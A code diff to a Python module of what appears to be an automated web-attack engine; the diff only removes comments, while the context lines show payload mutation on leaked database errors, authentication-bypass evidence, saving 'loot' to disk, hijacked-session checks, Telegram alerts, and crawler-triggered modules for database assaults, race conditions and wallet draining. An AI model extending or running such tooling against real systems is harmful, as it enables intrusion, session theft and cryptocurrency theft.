@@ -222,7 +222,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
     # ========================================================
 
-    # Strict SPA Shell Defense: Ignore generic client-side React/Next.js router shells
     is_spa_shell = (
         "<div id=\"root\"></div>" in body or 
         "<div id=\"__next\"></div>" in body or 
@@ -243,7 +242,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 
         stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})
 
-        # PERSIST LOOT TO DISK AUTOMATICALLY
         save_session_loot(
             target=target_url or "unknown_target",
             endpoint=endpoint,
@@ -267,7 +265,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
         sys.stdout.flush()
         
-        # PERSIST ERROR LOOT TO DISK
         save_session_loot(
             target=target_url or "unknown_target",
             endpoint=endpoint,
@@ -494,11 +491,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
         verify_hijacked_session(transport)
 
-    # ========================================================
-    # INTELLIGENCE-DRIVEN CONDITIONAL MODULE DISPATCH GATES
-    # ========================================================
-    
-    # 1. Referral Gateway Validation Audit: ONLY activate if crawler detects referral/invite paths
     has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
     if has_referral_surface:
         section("REFERRAL GATEWAY VALIDATION AUDIT (TRIGGERED BY CRAWLER)")
@@ -545,7 +537,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
 
-    # 2. Database Assault: Only trigger if login/query endpoints are mapped
     has_db_surface = any("login" in p.lower() or "auth" in p.lower() or "user" in p.lower() for p in discovered_paths)
     if has_db_surface:
         try:
@@ -585,7 +576,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
 
-    # 3. Wallet Drain / Web3 Auditor: Only trigger if Web3 / crypto endpoints or keywords are discovered
     has_web3_surface = any("crypto" in p.lower() or "wallet" in p.lower() or "drain" in p.lower() or "token" in p.lower() for p in discovered_paths)
     if has_web3_surface:
         try:
